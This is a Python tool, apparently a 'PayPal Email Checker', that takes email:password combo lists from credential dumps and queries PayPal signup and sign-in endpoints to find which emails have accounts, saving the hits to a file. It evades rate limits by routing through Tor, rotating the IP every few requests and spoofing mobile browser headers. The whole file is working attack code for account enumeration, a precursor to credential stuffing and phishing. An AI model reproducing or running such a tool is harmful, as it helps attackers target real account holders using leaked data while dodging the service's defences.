import os, time, threading, requests, tkinter, json, re
from tkinter import filedialog
from stem import Signal
from stem.control import Controller

root = tkinter.Tk()
root.withdraw()
lock = threading.Lock()

class PaypalEmailChecker:
    def __init__(self):
        self.emails = []
        self.client = requests.Session()
        self.hits, self.bad, self.errors = 0, 0, 0
        self.tor_proxy = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }
        # Headers plus réalistes - mobile Chrome
        self.base_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }

    def restart_tor(self):
        print('[+] Restarting Tor service...')
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', 'tor'], capture_output=True, text=True, check=True)
            print('[+] Tor restarted successfully.')
            print('[*] Waiting 5 seconds for Tor to establish connections...')
            time.sleep(2.5)  # ← 2.5 secondes ici
        except:
            print('[!] Failed to restart Tor (continuing anyway)')

    def renew_tor_ip(self):
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                time.sleep(3)
        except:
            pass

    def get_initial_cookies(self):
        """Récupère les cookies de session avant toute requête API"""
        try:
            r = self.client.get(
                'https://www.paypal.com/signin',
                headers=self.base_headers,
                proxies=self.tor_proxy,
                timeout=15
            )
            return r.cookies.get_dict()
        except:
            return {}

    def load_combos(self):
        try:
            input('[#] Press ENTER to select combos file')
            file = filedialog.askopenfile(parent=root, mode='rb', title='Choose combos file',
                                          filetype=(('txt', '*.txt'), ('All files', '*.txt')))
            if not file:
                raise Exception("No file")
            with open(file.name, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp.readlines():
                    line = line.strip()
                    if ':' in line:
                        email = line.split(':', 1)[0].strip()
                        if email and '@' in email:
                            self.emails.append(email)
            print(f'[+] {len(self.emails)} emails extracted from combos')
        except:
            path = input('[#] Enter file path> ')
            with open(path, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp.readlines():
                    line = line.strip()
                    if ':' in line:
                        email = line.split(':', 1)[0].strip()
                        if email and '@' in email:
                            self.emails.append(email)
            print(f'[+] {len(self.emails)} emails extracted from combos')

    def checker(self, email_list):
        for idx, email in enumerate(email_list):
            try:
                # Rotation Tor
                if idx > 0 and idx % 3 == 0:
                    print(f'[*] Rotating Tor (request #{idx})...')
                    self.renew_tor_ip()
                    time.sleep(2)

                # Étape 1: Récupérer la page d'accueil pour les cookies
                cookies = self.get_initial_cookies()
                time.sleep(1)

                # Étape 2: Tenter via l'API de validation d'email d'inscription
                headers = {
                    **self.base_headers,
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.paypal.com',
                    'Referer': 'https://www.paypal.com/signup',
                }

                # L'API validate email
                payload = json.dumps({
                    "email": email,
                    "countryCode": "US",
                    "localeCode": "en_US",
                    "source": "SIGNUP"
                })

                # Essai via l'endpoint de validation d'email
                r = self.client.post(
                    'https://www.paypal.com/wallet/web/auth/validate_email',
                    headers=headers,
                    data=payload,
                    cookies=cookies,
                    proxies=self.tor_proxy,
                    timeout=15,
                    allow_redirects=False
                )

                response_text = r.text.lower()

                # Analyse de la réponse
                # PayPal renvoie généralement quelque chose comme:
                # {"email_already_registered": true} ou {"valid": false}
                try:
                    data = r.json()
                    if data.get('email_already_registered') or data.get('exists'):
                        self._hit(email)
                    elif data.get('registered'):
                        self._hit(email)
                    else:
                        self._bad(email)
                except:
                    # Fallback: réponse textuelle
                    if 'already' in response_text or 'registered' in response_text or 'exists' in response_text:
                        self._hit(email)
                    elif 'invalid' in response_text or 'not found' in response_text or 'does not exist' in response_text:
                        self._bad(email)
                    else:
                        # Étape 3: Second endpoint si le premier est ambigu
                        self._try_secondary(email, cookies)

            except requests.ConnectionError:
                with lock:
                    print(f'[!] Connection error: {email}')
                    self.errors += 1
            except Exception as e:
                with lock:
                    print(f'[!] Error: {email} -> {e}')
                    self.errors += 1

    def _try_secondary(self, email, cookies):
        """Endpoint alternatif de vérification"""
        try:
            headers = {
                **self.base_headers,
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Referer': 'https://www.paypal.com/signin',
            }
            r = self.client.post(
                'https://www.paypal.com/auth/api/check-email',
                headers=headers,
                json={"email": email},
                cookies=cookies,
                proxies=self.tor_proxy,
                timeout=10
            )
            data = r.json()
            if data.get('exists') or data.get('accountExists'):
                self._hit(email)
            else:
                self._bad(email)
        except:
            self._bad(email)

    def _hit(self, email):
        with lock:
            print(f'[\033[32mEXIST\033[0m] {email}')
            os.makedirs('./results', exist_ok=True)
            with open('./results/existing_emails.txt', 'a+', encoding='utf-8') as f:
                f.write(f'{email}\n')
            self.hits += 1

    def _bad(self, email):
        with lock:
            print(f'[\033[31mNOT FOUND\033[0m] {email}')
            self.bad += 1

    def worker(self, email_list):
        return [email_list[i::self.thread_count] for i in range(self.thread_count)]

    def main(self):
        self.restart_tor()
        os.system('cls' if os.name == "nt" else 'clear')
        print('''
╔════════════════════════════════════════╗
║        PAYPAL EMAIL CHECKER v2         ║
║    Multi-endpoint + Cookie Handling    ║
╚════════════════════════════════════════╝
        ''')
        self.load_combos()
        self.thread_count = int(input('[?] Threads (1-3 recommandé)> '))

        threads = []
        chunks = self.worker(self.emails)
        for i in range(self.thread_count):
            t = threading.Thread(target=self.checker, args=[chunks[i]])
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'\n[+] Done. Hits: {self.hits} | Not found: {self.bad} | Errors: {self.errors}')

if __name__ == '__main__':
    x = PaypalEmailChecker()
    x.main()
